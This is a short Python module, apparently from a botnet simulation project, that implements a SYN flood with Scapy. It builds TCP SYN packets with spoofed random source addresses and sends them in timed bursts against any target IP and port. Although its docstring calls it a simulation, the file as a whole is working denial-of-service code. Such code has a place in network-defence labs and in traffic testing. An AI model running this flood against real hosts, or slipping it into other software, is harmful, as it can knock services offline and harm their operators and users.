"""SYN flood attack simulation using Scapy."""

from __future__ import annotations

import logging
import os
import random
import time
from typing import Optional

from scapy.all import IP, TCP, RandShort, Raw, send

LOG_FORMAT = "[%(asctime)s][%(name)s][%(levelname)s] %(message)s"
DATE_FORMAT = "%Y-%m-%dT%H:%M:%S"
LOGGER = logging.getLogger("botnet.syn_flood")


def configure_logging() -> None:
    """Configure module logging.

    Args:
        None.

    Returns:
        None.
    """
    logging.basicConfig(level=os.getenv("LOG_LEVEL", "INFO"), format=LOG_FORMAT, datefmt=DATE_FORMAT)


def run_syn_flood(target_ip: str, duration_seconds: int, packet_rate: int, target_port: int = 80) -> int:
    """Send a SYN flood stream to the target.

    Args:
        target_ip: Destination IP address.
        duration_seconds: Duration of the attack.
        packet_rate: Packets per second.
        target_port: Destination TCP port.

    Returns:
        Total packets transmitted.
    """
    end_time = time.time() + duration_seconds
    total_packets = 0
    while time.time() < end_time:
        burst_size = max(1, packet_rate)
        packets = []
        for _ in range(burst_size):
            source_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packets.append(
                IP(src=source_ip, dst=target_ip)
                / TCP(sport=int(RandShort()), dport=target_port, flags="S", seq=random.randint(0, 2**32 - 1))
                / Raw(load=b"botnet-test")
            )
        send(packets, verbose=False)
        total_packets += len(packets)
        time.sleep(1)
    LOGGER.info("SYN flood finished: %s packets sent to %s", total_packets, target_ip)
    return total_packets
